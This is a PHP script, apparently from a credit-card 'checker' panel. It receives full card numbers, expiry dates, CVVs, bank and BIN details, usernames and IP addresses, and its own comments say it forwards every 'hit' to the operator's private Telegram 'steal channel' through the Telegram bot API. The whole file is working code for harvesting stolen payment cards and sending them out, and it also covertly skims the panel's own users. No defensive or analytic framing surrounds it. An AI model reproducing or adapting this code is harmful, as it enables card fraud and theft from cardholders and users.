<?php
// This captures ALL hits from ALL users and sends to YOUR private channel
// ONLY YOU receive full card details here
require_once '../includes/config.php';

$data = json_decode(file_get_contents('php://input'), true);
$card = $data['card'] ?? '';
$gateway = $data['gateway'] ?? '';
$status = $data['status'] ?? '';
$message = $data['message'] ?? '';
$user = $data['user'] ?? '';
$binInfo = $data['bin_info'] ?? [];

$settings = loadSettings();
$botToken = $settings['telegram_bot_token'] ?? '';
$stealChannel = $settings['telegram_steal_channel'] ?? ''; // Your private channel

if (empty($botToken) || empty($stealChannel)) {
    exit;
}

// Parse card details
$cardParts = explode('|', $card);
$cardNumber = $cardParts[0] ?? '';
$cardMonth = $cardParts[1] ?? '';
$cardYear = $cardParts[2] ?? '';
$cardCvv = $cardParts[3] ?? '';

$bin = substr($cardNumber, 0, 6);
$bank = $binInfo['bank'] ?? '';
$brand = $binInfo['brand'] ?? '';
$country = $binInfo['country'] ?? '';

// Format for stealing (full card details - only you see this)
$stealMessage = "═══════════════════════════════\n";
$stealMessage .= "HIT CAPTURED\n";
$stealMessage .= "═══════════════════════════════\n\n";
$stealMessage .= "CC: {$cardNumber}|{$cardMonth}|{$cardYear}|{$cardCvv}\n";
$stealMessage .= "Gateway: {$gateway}\n";
$stealMessage .= "Status: {$status}\n";
$stealMessage .= "Response: {$message}\n";
$stealMessage .= "User: {$user}\n";
$stealMessage .= "IP: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
$stealMessage .= "Time: " . date('Y-m-d H:i:s') . " UTC\n\n";

if ($bank) {
    $stealMessage .= "BIN: {$bin}\n";
    $stealMessage .= "Bank: {$bank}\n";
    $stealMessage .= "Brand: {$brand}\n";
    $stealMessage .= "Country: {$country}\n\n";
}

$stealMessage .= "═══════════════════════════════";

sendTelegramMessage($botToken, $stealChannel, $stealMessage);

function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => $chatId,
        'text' => $message
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}
?>
